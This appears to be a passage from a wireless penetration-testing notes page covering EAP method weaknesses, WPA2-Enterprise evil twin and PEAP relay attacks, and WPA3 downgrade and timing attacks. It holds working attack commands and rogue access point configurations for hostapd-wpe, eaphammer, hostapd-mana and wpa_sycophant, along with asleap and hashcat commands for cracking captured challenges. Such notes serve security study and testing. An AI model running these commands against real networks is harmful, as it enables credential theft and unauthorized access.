<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>sudo ./krack-all-zero-tk.py wlan0 wlan1 CorpoWPA2 --target 00:1C:10:00:00:00
</span></code></pre></div>
<h3 id="frag-attack">FRAG Attack</h3>
<ul>
<li>https://www.fragattacks.com/</li>
</ul>
<h1 id="wpa2-enterprise">WPA2 Enterprise</h1>
<ul>
<li>EAP : Extended Authentication Protocol</li>
<li>RFC : https://www.rfc-editor.org/rfc/rfc5247.html</li>
<li>802.1X : EAP adopted by 802.11</li>
</ul>
<p><img src="/images/eap.png" width="700"/></p>
<h3 id="wpa_supplicant-and-eap">wpa_supplicant and EAP</h3>
<p>Authenticate to WPA EAP network using wpa_supplicant
<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>wpa_supplicant -i wlan0 -c ./wpa_supplicant.conf
</span></code></pre></div></p>
<p>wpa_supplicant.conf
<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>network={
</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>  ssid=&quot;YOUR_SSID&quot;
</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>  scan_ssid=1
</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a>  key_mgmt=WPA-EAP
</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a>  identity=&quot;YOUR_USERNAME&quot;
</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a>  password=&quot;YOUR_PASSWORD&quot;
</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a>  eap=PEAP
</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a>  phase1=&quot;peaplabel=0&quot;
</span><span id="__span-41-9"><a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a>  phase2=&quot;auth=MSCHAPV2&quot;
</span><span id="__span-41-10"><a id="__codelineno-41-10" name="__codelineno-41-10" href="#__codelineno-41-10"></a>}
</span></code></pre></div></p>
<h2 id="eap-types">EAP Types</h2>
<p>EAP is an authentication framework that defines the transport and usage of identity credentials. EAP encapsulates the usernames, passwords, certificates, tokens, OTPs, etc. that a client is sending for purposes of authentication.  </p>
<p><img src="/images/eap_tun_not_tun.png" width="700"/></p>
<h4 id="eap-md5">EAP-MD5</h4>
<ul>
<li>
<p>Non tunnel EAP method</p>
</li>
<li>
<p>Radius send 16 bytes MD5 Challenge</p>
</li>
<li>Client send MD5 hash of </li>
<li>Responde ID</li>
<li>Password</li>
<li>Challenge</li>
</ul>
<p>--&gt; Attacker can eavesdrop and sniff MD5 challenge. (vulnerable to dictionnary attack)<br />
--&gt; No mutual authentication: Server is validating the client, but the client does not authenticate the Server (i.e.: does not check to see if it should trust the server).<br />
- https://github.com/joswr1ght/eapmd5pass
<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>./eapmd5pass -w dict -r eapmd5-sample.dump 
</span></code></pre></div></p>
<p><img src="/images/eap-md5.png" width="700"/></p>
<h4 id="eap-pap">EAP-PAP</h4>
<ul>
<li>Non tunnel EAP method
EAP-PAP is the most insecure 802.1x Authentication Protocol because credentials are sent over the air in plaintext.  </li>
<li>https://datatracker.ietf.org/doc/html/rfc1334</li>
</ul>
<h4 id="eap-gtc-generic-token-card">EAP-GTC - Generic Token Card</h4>
<ul>
<li>Non tunnel EAP method
EAP method created by cisco. 
--&gt; <a href="https://www.rfc-editor.org/rfc/rfc3748">EAP-GTC</a> carries a text challenge from the authentication server and a reply generated by a security token. Exchange of clear-text authentication credentials across the network. EAP-GTC method is intended to be used with Token Cards supporting challenge/response verification.  </li>
</ul>
<h4 id="eap-chap-challenge-handshake-authentication-protocol">EAP-CHAP - Challenge Handshake Authentication Protocol</h4>
<ul>
<li>Non tunnel EAP method</li>
<li>https://datatracker.ietf.org/doc/html/rfc1994</li>
</ul>
<p>3 way handshake process:
1. The authentication server issues a challenge (Nonce)
2. The users's device sends the hashed Nonce with the user password
3. The authentication server evaluate the hashed Nonce</p>
<h4 id="eap-aka">EAP-AKA</h4>
<ul>
<li>Non tunnel EAP method
EAP Authentication and Key Agreement. (<a href="https://datatracker.ietf.org/doc/html/rfc4187">RFC 4187</a>)</li>
</ul>
<h4 id="eap-mschapv2-microsoft-challenge-authentication-protocol-version-2">EAP-MSCHAPv2 - Microsoft Challenge Authentication Protocol version 2</h4>
<ul>
<li>Non tunnel EAP method</li>
</ul>
<p>Same as CHAP but Microsoft Proprietary system.<br />
- Mutual authentication
- Key agreement mechanism for setting up an encrypted session based on the authentication handshake.</p>
<ul>
<li>DefCon 20 : Moxie MarlinSpike : https://www.youtube.com/watch?v=gkPvZDcrLFk</li>
<li>Hacktivity : Vivek Ramachandran : https://youtu.be/Ra0dGPYScLQ</li>
</ul>
<p>--&gt; Packet Capture + asleap = Dictionnary attack  </p>
<p><img src="/images/mschapv2.png" width="700"/></p>
<h4 id="eap-pwd">EAP-PWD</h4>
<ul>
<li>Non tunnel EAP method
EAP Password, EAP method which uses a shared password for authentication. </li>
</ul>
<p><img src="/images/eap_pwd.png" width="500"/></p>
<h4 id="eap-noob">EAP-NOOB</h4>
<ul>
<li>Non tunnel EAP method</li>
<li>https://datatracker.ietf.org/doc/draft-aura-eap-noob/?include_text=1</li>
</ul>
<p>Nimble out-of-band authentication for EAP, generic bootstrapping solution for devices which have no pre-configured authentication credentials and which are not yet registered on any server. (IoT, Gadgets, Toys).  </p>
<p>Authentication for this EAP method is based on a user-assisted out-of-band (OOB) channel between the server and peer.<br />
- QR code
- NFC tags
- Audio</p>
<p>--&gt; <a href="https://arxiv.org/pdf/1902.07550.pdf">Misbinding</a> <a href="https://www.sciencedirect.com/science/article/pii/S2214212619307215">attack</a></p>
<h4 id="leap-light-weight-eap">LEAP - Light Weight EAP</h4>
<p>Cisco proprietary EAP method based on modified version of MSCHAP. User credentials not strongly protected.
- Tool: <a href="https://github.com/joswr1ght/asleap">asleap</a></p>
<ol>
<li>STA requests authentication with 802.1X start message</li>
<li>AP issues a random 8-byte challenge</li>
<li>STA encrypts the 8-byte challenge 3 times, using the NT hash of their password as seed material. The STA then joins the 3 DES outputs as a single 24-byte response.</li>
<li>AP issues a success or failure message.</li>
<li>STA issues a 8-byte challenge.</li>
<li>AP responds with a 24-byte response.</li>
<li>STA is able to send data to the distribution system</li>
</ol>
<h4 id="eap-fast-flexible-authentication-by-secure-tunneling">EAP-FAST - Flexible Authentication by Secure Tunneling</h4>
<ul>
<li>Non tunnel EAP method</li>
</ul>
<p>Instead of using a certificate to achieve mutual authentication. EAP-FAST authenticates by means of a PAC (Protected Access Credential) which can be managed dynamically by the authentication server. The PAC can be provisioned (distributed one time) to the client either manually or automatically.  </p>
<p>Manual provisioning is delivery to the client via disk or a secured network distribution method. Automatic provisioning is an in-band, over the air, distribution.  </p>
<h2 id="eap-encapsulation-tunnel">EAP Encapsulation (Tunnel)</h2>
<p>Hide sensitive/vulnerable part.  </p>
<h4 id="eap-peap">EAP-PEAP</h4>
<p>PEAP - Protected EAP. 
- https://sensepost.com/blog/2019/understanding-peap-in-depth/</p>
<p>--&gt; Tunnel MSCHAPv2 or other within a PEAP tunnel (TLS tunnel) 
--&gt; Mostly used with MSCHAPv2 authentication.   </p>
<ul>
<li>Use Server Side Certificate for validation of the authentication server.  </li>
</ul>
<h4 id="eap-tls-transport-layer-security">EAP-TLS - Transport Layer Security</h4>
<p>EAP-TLS is still considered one of the most secure EAP standards available.<br />
--&gt; EAP-TLS require mutual authentication using client-side X.509 certificates.  </p>
<p><img src="/images/eap-tls.png" width="700"/></p>
<h4 id="eap-ttls-tunneled-tls">EAP-TTLS - Tunneled TLS</h4>
<p>EAP-Tunneled Transport Layer Security.<br />
Very Similar to EAP-PEAP. (But as option to use client side certificate)</p>
<ol>
<li>Server authenticates with certificate</li>
<li>Client can optionally use Certificate as well</li>
</ol>
<p>Inner authentication:
- PAP
- CHAP
- MSCHAP
- MSCHAPV2</p>
<h3 id="identity-privacy-misconfiguration">Identity Privacy misconfiguration</h3>
<ul>
<li>Absence of Identity Privacy
During 802.1x EAP negotiations, client send its identity to the authenticator before engaging in the RADIUS authentication process.<br />
--&gt; EAPOL frames within the first authentication phase are not encrypted<br />
--&gt; An attacker can see the AD usernames in plaintext  </li>
</ul>
<h3 id="wpa2-eap-password-spray-attack">WPA2-EAP - Password spray attack</h3>
<ul>
<li>https://mikeallen.org/blog/2016-10-06-breaking-into-wpa-enterprise-networks-with-air-hammer/</li>
</ul>
<h3 id="wpa2-eap-evil-twin-attack">WPA2-EAP Evil Twin Attack</h3>
<h4 id="hostapd-wpe-previously-freeradius-wpe">Hostapd-WPE (Previously FreeRadius WPE)</h4>
<ul>
<li>https://github.com/OpenSecurityResearch/hostapd-wpe</li>
<li>https://www.c0d3xpl0it.com/2017/03/enterprise-wifi-hacking-with-hostapd-wpe.html</li>
<li>https://github.com/WJDigby/apd_launchpad/blob/master/apd_launchpad.py (fake certficat generation and configuration file)</li>
</ul>
<p>Support the following EAP types for impersonation:
- EAP-FAST/MSCHAPv2 (Phase 0)
- PEAP/MSCHAPv2
- EAP-TTLS/MSCHAPv2
- EAP-TTLS/MSCHAP
- EAP-TTLS/CHAP
- EAP-TTLS/PAP</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>apt install hostadp-wpe
</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>ifconfig wlan1 down
</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>hostapd-wpe ./evilhostapd.conf
</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>
</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a>username: jdoe
</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a>    challenge: bc:87:6c:48:37:d3:92:6e
</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a>    response: 2d:00:61:59:56:06:02:dd:35:4a:0f:99:c8:6b:e1:fb:a3:04:ca:82:40:92:7c:f0
</span></code></pre></div>
<p>evilhostapd.conf configuration file
<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>interface=wlan1
</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>ssid=EvilCorp
</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>channel=6
</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a>hw_mode=g
</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a>wpa=3
</span><span id="__span-44-6"><a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a>wpa_key_mgmt=WPA-EAP
</span><span id="__span-44-7"><a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a>wpa_pairwise=TKIP CCMP
</span><span id="__span-44-8"><a id="__codelineno-44-8" name="__codelineno-44-8" href="#__codelineno-44-8"></a>auth_algs=3
</span><span id="__span-44-9"><a id="__codelineno-44-9" name="__codelineno-44-9" href="#__codelineno-44-9"></a>ieee8021x=1
</span><span id="__span-44-10"><a id="__codelineno-44-10" name="__codelineno-44-10" href="#__codelineno-44-10"></a>eapol_key_index_workaround=0
</span><span id="__span-44-11"><a id="__codelineno-44-11" name="__codelineno-44-11" href="#__codelineno-44-11"></a>eap_server=1
</span><span id="__span-44-12"><a id="__codelineno-44-12" name="__codelineno-44-12" href="#__codelineno-44-12"></a>eap_user_file=/root/certs/hostapd.eap_user
</span><span id="__span-44-13"><a id="__codelineno-44-13" name="__codelineno-44-13" href="#__codelineno-44-13"></a>ca_cert=/root/certs/server.pem
</span><span id="__span-44-14"><a id="__codelineno-44-14" name="__codelineno-44-14" href="#__codelineno-44-14"></a>server_cert=/root/certs/server.pem
</span><span id="__span-44-15"><a id="__codelineno-44-15" name="__codelineno-44-15" href="#__codelineno-44-15"></a>private_key=/root/certs/server.key
</span><span id="__span-44-16"><a id="__codelineno-44-16" name="__codelineno-44-16" href="#__codelineno-44-16"></a>private_key_passwd=
</span><span id="__span-44-17"><a id="__codelineno-44-17" name="__codelineno-44-17" href="#__codelineno-44-17"></a>dh_file=/root/certs/dhparam.pem
</span><span id="__span-44-18"><a id="__codelineno-44-18" name="__codelineno-44-18" href="#__codelineno-44-18"></a>mana_wpe=1
</span><span id="__span-44-19"><a id="__codelineno-44-19" name="__codelineno-44-19" href="#__codelineno-44-19"></a>mana_eapsuccess=1
</span></code></pre></div></p>
<p>hostapd.eap.user
<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>* PEAP,TTLS,TLS,MD5,GTC
</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>&quot;t&quot; TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP &quot;1234test&quot; [2]
</span></code></pre></div></p>
<p>Cracking the NetNTLM challenge using <strong>asleap</strong> or <strong>hashcat</strong>.<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>asleap -C bc:87:6c:48:37:d3:92:6e -R 2d:00:61:59:56:06:02:dd:35:4a:0f:99:c8:6b:e1:fb:a3:04:ca:82:40:92:7c:f0 -W wordlist 
</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>./hashcat64.bin -a 0 -m 5500 hash.txt dictionary.txt -r rule.txt
</span></code></pre></div></p>
<h4 id="eaphammer">Eaphammer</h4>
<p>Create an identical fake certificate for authentication server.
<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>./eaphammer --cert-wizard
</span></code></pre></div></p>
<p>Execute evil twin attack on channel 4 against CORPOWIFI SSID
<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CORPOWIFI --creds
</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>/eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CORPOWIFI --creds --negotiate weakest
</span></code></pre></div></p>
<p>Cracking the NetNTLM challenge using asleap
<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>asleap -C 06:9b:40:83:37:90:fd:41 -R 27:63:33:83:e7:25:98:5e:6d:4f:ed:73:b9:c5:1a:cc:91:13:bc:f9:13:95:30:56 -W ../wordlists/100-common-passwords.txt
</span></code></pre></div></p>
<h4 id="wpa2-eap-relay">WPA2-EAP Relay</h4>
<ul>
<li>https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/</li>
<li>https://sensepost.com/blog/2019/understanding-peap-in-depth/</li>
<li>https://github.com/sensepost/wpa_sycophant</li>
<li>https://www.youtube.com/watch?v=eYsGyvGxlpI</li>
</ul>
<p>--&gt; This attack need at least 2 interfaces (and 3 in case of deauthentication frame to be sent).  </p>
<ol>
<li>Mana will pretend to be corporate AP</li>
<li>Supplicant (wpa_sycophant) retrieving the required information from mana to connect to the legitimate corporate AP.</li>
</ol>
<p><img src="/images/peap_relay.png" width="700"/></p>
<p>This attack can fail if :
- User doesn't accept the rogue certificate
- Cryptographic binding (cryptobinding)
  - When cryptobinding is enabled it creates a connection between the two tunnels to ensure that the client that is authenticating against the RADIUS server is the same client that created the initial TLS tunnel to the access point.</p>
<p>Running hostapd-mana
<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>hostapd-mana hostapd.conf | grep &#39;SYCOPHANT\|MANA&#39;
</span></code></pre></div></p>
<p>hostapd.conf file
<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>interface=wlan0
</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>ssid=CorpoSSID
</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a>channel=6
</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a>hw_mode=g
</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a>wpa=3
</span><span id="__span-51-6"><a id="__codelineno-51-6" name="__codelineno-51-6" href="#__codelineno-51-6"></a>wpa_key_mgmt=WPA-EAP
</span><span id="__span-51-7"><a id="__codelineno-51-7" name="__codelineno-51-7" href="#__codelineno-51-7"></a>wpa_pairwise=TKIP CCMP
</span><span id="__span-51-8"><a id="__codelineno-51-8" name="__codelineno-51-8" href="#__codelineno-51-8"></a>auth_algs=3
</span><span id="__span-51-9"><a id="__codelineno-51-9" name="__codelineno-51-9" href="#__codelineno-51-9"></a>ieee8021x=1
</span><span id="__span-51-10"><a id="__codelineno-51-10" name="__codelineno-51-10" href="#__codelineno-51-10"></a>eapol_key_index_workaround=0
</span><span id="__span-51-11"><a id="__codelineno-51-11" name="__codelineno-51-11" href="#__codelineno-51-11"></a>eap_server=1
</span><span id="__span-51-12"><a id="__codelineno-51-12" name="__codelineno-51-12" href="#__codelineno-51-12"></a>eap_user_file=/root/certs/hostapd.eap_user
</span><span id="__span-51-13"><a id="__codelineno-51-13" name="__codelineno-51-13" href="#__codelineno-51-13"></a>ca_cert=/root/certs/server.pem
</span><span id="__span-51-14"><a id="__codelineno-51-14" name="__codelineno-51-14" href="#__codelineno-51-14"></a>server_cert=/root/certs/server.pem
</span><span id="__span-51-15"><a id="__codelineno-51-15" name="__codelineno-51-15" href="#__codelineno-51-15"></a>private_key=/root/certs/server.key
</span><span id="__span-51-16"><a id="__codelineno-51-16" name="__codelineno-51-16" href="#__codelineno-51-16"></a>private_key_passwd=
</span><span id="__span-51-17"><a id="__codelineno-51-17" name="__codelineno-51-17" href="#__codelineno-51-17"></a>dh_file=/root/certs/dhparam.pem
</span><span id="__span-51-18"><a id="__codelineno-51-18" name="__codelineno-51-18" href="#__codelineno-51-18"></a>mana_wpe=1
</span><span id="__span-51-19"><a id="__codelineno-51-19" name="__codelineno-51-19" href="#__codelineno-51-19"></a>mana_eapsuccess=1
</span><span id="__span-51-20"><a id="__codelineno-51-20" name="__codelineno-51-20" href="#__codelineno-51-20"></a>enable_mana=1
</span><span id="__span-51-21"><a id="__codelineno-51-21" name="__codelineno-51-21" href="#__codelineno-51-21"></a>enable_sycophant=1
</span><span id="__span-51-22"><a id="__codelineno-51-22" name="__codelineno-51-22" href="#__codelineno-51-22"></a>sycophant_dir=/tmp/
</span></code></pre></div></p>
<p>Launching wpa_sycophant
<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>./wpa_sycophant.sh -c wpa_sycophant.conf -i wlan1
</span></code></pre></div></p>
<p>wpa_sycophant.conf (bssid_blacklist = MAC of your fake hostapd AP)
<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>network={
</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>  ssid=&quot;TestingEAP&quot;
</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a>  # The SSID you would like to relay and authenticate against. 
</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a>  scan_ssid=1
</span><span id="__span-53-5"><a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a>  key_mgmt=WPA-EAP
</span><span id="__span-53-6"><a id="__codelineno-53-6" name="__codelineno-53-6" href="#__codelineno-53-6"></a>  # Do not modify
</span><span id="__span-53-7"><a id="__codelineno-53-7" name="__codelineno-53-7" href="#__codelineno-53-7"></a>  identity=&quot;&quot;
</span><span id="__span-53-8"><a id="__codelineno-53-8" name="__codelineno-53-8" href="#__codelineno-53-8"></a>  anonymous_identity=&quot;&quot;
</span><span id="__span-53-9"><a id="__codelineno-53-9" name="__codelineno-53-9" href="#__codelineno-53-9"></a>  password=&quot;&quot;
</span><span id="__span-53-10"><a id="__codelineno-53-10" name="__codelineno-53-10" href="#__codelineno-53-10"></a>  # This initialises the variables for me.
</span><span id="__span-53-11"><a id="__codelineno-53-11" name="__codelineno-53-11" href="#__codelineno-53-11"></a>  # -------------
</span><span id="__span-53-12"><a id="__codelineno-53-12" name="__codelineno-53-12" href="#__codelineno-53-12"></a>  eap=PEAP
</span><span id="__span-53-13"><a id="__codelineno-53-13" name="__codelineno-53-13" href="#__codelineno-53-13"></a>  # Read https://w1.fi/cgit/hostap/plain/wpa_supplicant/wpa_supplicant.conf for help with phase1 options. 
</span><span id="__span-53-14"><a id="__codelineno-53-14" name="__codelineno-53-14" href="#__codelineno-53-14"></a>  # This attempts to force the client not use cryptobinding. 
</span><span id="__span-53-15"><a id="__codelineno-53-15" name="__codelineno-53-15" href="#__codelineno-53-15"></a>  phase1=&quot;crypto_binding=0 peapver=0&quot;
</span><span id="__span-53-16"><a id="__codelineno-53-16" name="__codelineno-53-16" href="#__codelineno-53-16"></a>  phase2=&quot;auth=MSCHAPV2&quot;
</span><span id="__span-53-17"><a id="__codelineno-53-17" name="__codelineno-53-17" href="#__codelineno-53-17"></a>  # Dont want to connect back to ourselves,
</span><span id="__span-53-18"><a id="__codelineno-53-18" name="__codelineno-53-18" href="#__codelineno-53-18"></a>  # so add your rogue BSSID here.
</span><span id="__span-53-19"><a id="__codelineno-53-19" name="__codelineno-53-19" href="#__codelineno-53-19"></a>  bssid_blacklist=00:14:22:01:23:45
</span><span id="__span-53-20"><a id="__codelineno-53-20" name="__codelineno-53-20" href="#__codelineno-53-20"></a>}
</span></code></pre></div></p>
<h1 id="wpa3">WPA3</h1>
<p>The major improvement of WPA3 is a improved handshake (<em>Dragonfly-Handshake</em>) that makes it impossible for attackers to record the <em>4-Way Handshake</em> and launch a offline dictionary attack.  </p>
<p>The Dragonfly variant used in WPA3 is also known as <em>Simultaneous Authentication of Equals</em> (SAE).</p>
<p>WPA3 improvments:
- Provide mutual authentication
- Negotiate Session Key
- Prevent Offline Dictionary Attacks
- Perfect forward secrecy</p>
<p>WPA3 also introduces <em>perfect forward secrecy</em> which prevents attackers from decrypting past traffic after a key breach.</p>
<p>Additionally, WPA3 supports <em>Protected Management Frames</em> (PMF) which makes it impossible to launch <em>de-authentication attacks</em>.<br />
---&gt; WPA2 already supports this, therefore this is not a novelty of WPA3. However with WPA, PMF are included from the start in the certification program.</p>
<p><img src="/images/wpa2-wpa3-comparison.png" width="700"/></p>
<h3 id="owe-opportunistic-wireless-encryption">OWE : Opportunistic Wireless Encryption</h3>
<p>OWE authentication makes Wi-Fi network access as convenient as that in open authentication mode, allowing users to access the Wi-Fi network without entering the password. In OWE authentication mode, a STA and an AP perform a Diffie-Hellman key exchange to encrypt data transmitted between the STA and Wi-Fi network, thereby protecting user data security.  </p>
<p><img src="/images/owe.png" width="500"/></p>
<ul>
<li>https://posts.specterops.io/war-never-changes-attacks-against-wpa3s-enhanced-open-part-1-how-we-got-here-71f5a80e3be7</li>
<li>https://posts.specterops.io/war-never-changes-attacks-against-wpa3s-enhanced-open-part-2-understanding-owe-90fdc29126a1</li>
<li>https://posts.specterops.io/war-never-changes-attacks-against-wpa3s-enhanced-open-part-3-owe-nearly-indistinguishable-ad3b3928a35a</li>
</ul>
<h3 id="zkp-zero-knowledge-proof">ZKP - Zero Knowledge Proof</h3>
<p>Within WPA3 the important improvment come from the new handshake which does not transmit any secrets or credentials.  </p>
<p>A zero knowledge proof is a cartographic protocol that enables one party to to prove to another party that <em>they know a value x</em> without conveying any information other than the fact that they know the value of x. </p>
<p>WPA3 makes use of such a zero knowledge proof to ensure that no secrets of the passwords are transmitted in the <em>SAE handshake</em>. The <em>SAE handshake</em> is the first handshake realized before classical <em>4 way handshake</em> such as in WPA2.</p>
<p>SAE handshake goal is to make sure both handshake participants can be sure that the other party knows that they possess the same and correct password. <br />
--&gt; Mutual authentication (both parties prove that they have knowledge over the same password.)</p>
<h3 id="use-wpa3-sae-authentication-on-linux">Use WPA3-SAE authentication on Linux</h3>
<ul>
<li>https://askubuntu.com/questions/1290589/how-to-use-wpa3-with-ubuntu-20-04</li>
</ul>
<h3 id="wpa3-sae">WPA3-SAE</h3>
<p>SAE : Simultaneous Authentication of Equals (SAE)</p>
<p><img src="/images/sae.png" width="250"/></p>
<p>Before executing the DragonFly handshake, the password which may be stored in <em>ascii</em> or <em>unicode</em> needs to be converted in <em>group Element P</em>.<br />
This <em>group Element P</em> will be used within the cryptographic calculation of the handshake.</p>
<ul>
<li>P = Password element (PWE)</li>
<li>P = Hash(pw, STA, AP, counter)</li>
</ul>
<p><img src="/images/dragonfly1.png" width="250"/></p>
<p>Then the <em>Commit phase</em> can occur, this phase will be in charge of <em>negotiating the shared key</em> between Client and Access Point.</p>
<p><img src="/images/dragonfly2.png" width="250"/></p>
<p>Then a last step is realized <em>confirm phase</em> to validate both peers negotiate the same key which also proof they both posses the password.</p>
<p><img src="/images/dragonfly3.png" width="250"/></p>
<p>Dragonslayer: Implements attacks against EAP-pwd.
- https://github.com/vanhoefm/dragonslayer</p>
<p>Dragondrain: This tool can be used to test to which extent an Access Point is vulnerable to Denial-of-Service attacks against WPA3’s SAE handshake.
- https://github.com/vanhoefm/dragondrain-and-time</p>
<p>Dragontime: This is an experimental tool to perform timing attacks against the SAE handshake if MODP group 22, 23, or 24 is used. Note that most WPA3 implementations by default, do not enable these groups.
- https://github.com/vanhoefm/dragondrain-and-time</p>
<p>Dragonforce: This is an experimental tool which makes the information recover from our timing or cache-based attacks, and performs a password partitioning attack. This is similar to a dictionary attack.
- https://github.com/vanhoefm/dragonforce</p>
<h3 id="attacking-wpa3">Attacking WPA3</h3>
<p>Great <a href="https://www.youtube.com/watch?v=mjePCRkNb00">YouTube video</a> from <a href="https://www.youtube.com/@ClearToSend">Clear To Send Channel</a> for WPA3 specification explanation: https://www.youtube.com/watch?v=mjePCRkNb00</p>
<h4 id="wpa3-transition-downgrade-attack">WPA3-Transition Downgrade Attack</h4>
<p>Allow non WPA3-SAE compliant device to connect using WPA2-PSK.<br />
--&gt; <strong>Issue</strong>: WPA2 clients and WPA3 clients will use the same secret passphrase.  </p>
<p>2 techniques can be used:
1. Capture WPA2-PSK handshake of connecting client and crack the handshake
2. In case no clients use WPA2-PSK you can try to create fake WPA2-PSK and wait for client to connect, capture and crack WPA2 handshake
  - Same SSID
  - Same channel</p>
<p><strong>Steps</strong>:
1. Identify WPA3 transition network
- Check RSN element of beacon frame for both PSK and SAE presence
2. Create a WPA2-PSK network (any random wrong passphrase)
3. If PMF is enabled wait for the client (if not deauth the client) to make mistake, capture 4-way handshake and run dictionary attack</p>
<p><img src="/images/psksae.png" width="700"/></p>
<p>Below is the PMF related beacon, PMF is set as required and capable, so the bits are set to 1.</p>
<p><img src="/images/pmf.png" width="700"/></p>
<p><strong>Defense</strong>: Disable WPA3 transition mode and go for 2 separate networks with separate passphrase.</p>
<h4 id="security-group-downgrade-attack">Security Group Downgrade Attack</h4>
<p>Force a client to use a weak security group.  </p>
<p><strong>Steps</strong>:
1. Host a WPA3 honeypot and wait for client to connect
2. When client connects, reject the commit message till the time client doesn't use the weak group
3. Once the client connects, capture the dragonfly handshake and crack it</p>
<p>--&gt; Not working if weak security groups are not supported by the device.  </p>
<p><strong>Defense</strong>: </p>
<h4 id="wpa3-sae-timing-or-cache-password-paritioning">WPA3-SAE timing or cache password paritioning</h4>
<ul>
<li>https://github.com/vanhoefm/dragonforce</li>
</ul>
<h4 id="timing-attack-using-weak-group">Timing attack using weak group</h4>
<p>Timing attacks against the SAE handshake if MODP group 22, 23, or 24 is used. Note that most WPA3 implementations by default do not enable these groups.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>./dragontime -d wlan0 -c 1 -a 11:22:33:44:55:66 -g 27 -i 250 -t 750 -o measurements.txt
</span></code></pre></div>
